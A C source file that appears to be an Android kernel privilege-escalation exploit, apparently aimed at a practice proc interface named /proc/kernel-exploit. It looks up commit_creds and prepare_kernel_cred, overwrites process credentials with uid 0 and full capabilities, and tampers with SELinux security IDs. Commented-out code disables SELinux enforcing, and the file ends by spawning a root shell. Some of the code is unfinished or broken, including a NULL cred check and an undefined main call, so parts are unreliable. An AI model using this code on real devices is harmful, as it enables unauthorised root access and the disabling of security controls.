#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include "kallsyms.h"

#define DEVICE_SYMBOL(name)     #name

int run_bash(const char *command)
{
	/*if(getuid() != 0) {*/
		/*printf("failed to obtain root\n");*/
		/*return -1;*/
	/*}*/
	printf("current uid %d\n", getuid());

	if (!command) {
		printf("run root with system/bin/sh");
		system("/system/bin/sh");
	} else {
		printf("run root with system/bin/sh");
		execl("/system/bin/sh", "/system/bin/sh", "-c", "", NULL);
	}
	return 0;
}

//long local_data = run_bash;

struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *);
typedef int (*commit_creds_t)(struct cred *);
prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

bool
setup_prepare_kernel_cred_address(void)
{
	if (prepare_kernel_cred) {
		return true;
	}

	prepare_kernel_cred = kallsyms_get_symbol_address("prepare_kernel_cred");
	return !!prepare_kernel_cred;
}

bool
setup_commit_creds_address(void)
{
	if (commit_creds) {
		return true;
	}

	commit_creds = kallsyms_get_symbol_address("commit_creds");
	return !!commit_creds;
}

static void obtain_root_privilege_by_commit_creds(void)
{
	commit_creds(prepare_kernel_cred(0));
}

struct thread_info;
struct task_struct;
struct cred;
struct kernel_cap_struct;
struct task_security_struct;
struct list_head;

struct thread_info {
        unsigned long           flags;          /* low level flags */
        unsigned long            addr_limit;     /* address limit */
        struct task_struct      *task;          /* main task structure */
	/*....*/
};

struct kernel_cap_struct {
	unsigned long cap[2];
};

struct cred {
	unsigned long usage;
	uid_t uid;
	gid_t gid;
	uid_t suid;
	gid_t sgid;
	uid_t euid;
	gid_t egid;
	uid_t fsuid;
	gid_t fsgid;
	unsigned long securebits;
	struct kernel_cap_struct cap_inheritable;
	struct kernel_cap_struct cap_permitted;
	struct kernel_cap_struct cap_effective;
	struct kernel_cap_struct cap_bset;
	unsigned char jit_keyring;
	void *thread_keyring;
	void *request_key_auth;
	void *tgcred;
	struct task_security_struct *security;

	/* ... */
};

struct list_head {
	struct list_head *next;
	struct list_head *prev;
};

struct task_security_struct {
	unsigned long osid;
	unsigned long sid;
	unsigned long exec_sid;
	unsigned long create_sid;
	unsigned long keycreate_sid;
	unsigned long sockcreate_sid;
};


struct task_struct_partial {
	struct list_head cpu_timers[3];
	struct cred *real_cred;
	struct cred *cred;
	struct cred *replacement_session_keyring;
	char comm[16];
};

#define THREAD_SIZE            8192 * 2

static inline struct thread_info *
current_thread_info(void)
{
	register unsigned long sp asm ("sp");
	return (struct thread_info *)(sp & ~(THREAD_SIZE - 1));
}

static void
obtain_root_privilege_by_modify_task_cred(void)
{
	struct thread_info *info;
	struct cred *cred;
	struct task_security_struct *security;
	unsigned long addr_limit;
	int i;

	info = current_thread_info();
	addr_limit = info->addr_limit;
	cred = NULL;

	if (cred == NULL) {
		return;
	}

	cred->uid = 0;
	cred->gid = 0;
	cred->suid = 0;
	cred->sgid = 0;
	cred->euid = 0;
	cred->egid = 0;
	cred->fsuid = 0;
	cred->fsgid = 0;

	cred->cap_inheritable.cap[0] = 0xffffffff;
	cred->cap_inheritable.cap[1] = 0xffffffff;
	cred->cap_permitted.cap[0] = 0xffffffff;
	cred->cap_permitted.cap[1] = 0xffffffff;
	cred->cap_effective.cap[0] = 0xffffffff;
	cred->cap_effective.cap[1] = 0xffffffff;
	cred->cap_bset.cap[0] = 0xffffffff;
	cred->cap_bset.cap[1] = 0xffffffff;

	security = cred->security;
	if (security) {
		if (security->osid != 0
			&& security->sid != 0
			&& security->exec_sid == 0
			&& security->create_sid == 0
			&& security->keycreate_sid == 0
			&& security->sockcreate_sid == 0) {
			security->osid = 1;
			security->sid = 1;
		}
	}
}


struct proc_data {
	void *addr;
	unsigned long val;
};

static unsigned long my_task = 0;

static int do_root(unsigned long stack_var)
{
	int ret;
	unsigned long i, cred, addr;
	unsigned int tmp0;
	struct thread_info *thread_info = stack_var & (~(THREAD_SIZE - 1));
	printf("thread_info %lx\n", thread_info);
	my_task = (unsigned long)&thread_info->task;
	printf("task %lx %lx\n", my_task, my_task - (unsigned long)thread_info);

	/*i = 1;*/
	/*addr = cred + (i+0) * 4;*/
	/*ret = kernel_write_32(addr, 0);*/
	/*addr = cred + (i+1) * 4;*/
	/*ret = kernel_write_32(addr, 0);*/
	/*addr = cred + (i+2) * 4;*/
	/*ret = kernel_write_32(addr, 0);*/
	/*addr = cred + (i+3) * 4;*/
	/*ret = kernel_write_32(addr, 0);*/
	/*addr = cred + (i+4) * 4;*/
	/*ret = kernel_write_32(addr, 0);*/
	/*addr = cred + (i+5) * 4;*/
	/*ret = kernel_write_32(addr, 0);*/
	/*addr = cred + (i+6) * 4;*/
	/*ret = kernel_write_32(addr, 0);*/
	/*addr = cred + (i+7) * 4;*/
	/*ret = kernel_write_32(addr, 0);*/

	/*//securebits: cred[i+8]*/
	/*// for full capabilities*/
	/*addr = cred + (i+9) * 4;*/
	/*ret = kernel_write_32(addr, 0xffffffff);*/
	/*addr = cred + (i+10) * 4;*/
	/*ret = kernel_write_32(addr, 0xffffffff);*/
	/*addr = cred + (i+11) * 4;*/
	/*ret = kernel_write_32(addr, 0xffffffff);*/
	/*addr = cred + (i+12) * 4;*/
	/*ret = kernel_write_32(addr, 0xffffffff);*/
	/*addr = cred + (i+13) * 4;*/
	/*ret = kernel_write_32(addr, 0xffffffff);*/
	/*addr = cred + (i+14) * 4;*/
	/*ret = kernel_write_32(addr, 0xffffffff);*/
	/*addr = cred + (i+15) * 4;*/
	/*ret = kernel_write_32(addr, 0xffffffff);*/
	/*addr = cred + (i+16) * 4;*/
	/*ret = kernel_write_32(addr, 0xffffffff);*/
	/*[> success! <]*/

	/*// disable SELinux*/
	/*kernel_write_32(SELINUX_ENFORCING, 0);*/

	return 0;
}

int kernel_cred(void)
{
	void *test;
	FILE *fd;
	char buf[16 + 8];
	printf("hello world!\n");
	if(kallsyms_exist()) {
		printf("kallsyms exist\n");
	}
	struct proc_data local_data = {0};

	setup_commit_creds_address();
	setup_prepare_kernel_cred_address();
	printf("prepare_kernel_cred %lx commit_creds %lx\n", prepare_kernel_cred, commit_creds);
//	if (prepare_kernel_cred && commit_creds)
//		obtain_root_privilege_by_commit_creds();

	printf("fopen\n");
	fd = fopen("/proc/kernel-exploit", "w");
	if (fd == NULL) {
		printf("open proc/kernel-exploit error\n");
		return -1;
	}
	struct thread_info *info = current_thread_info();
	printf("%lx\n", info);

	//printf("%lx %lx local data %lx %lx\n", run_bash, &run_bash, local_data, &local_data);
	//memset(buf, 1, sizeof(buf));
	//memcpy(buf, &run_bash , 32);
	//fwrite(0, sizeof(long) * 2, 1, fd);
	fwrite(&local_data, sizeof(long) * 2, 1, fd);
	/*fread(&local_data, 2, 1, fd);*/
	fclose(fd);
	printf("stack var %lx\n", local_data.val);
	do_root(local_data.val);
	run_bash(NULL);
	return 0;
}

int main()
{
	do_test_ioctl();
	return 0;
}
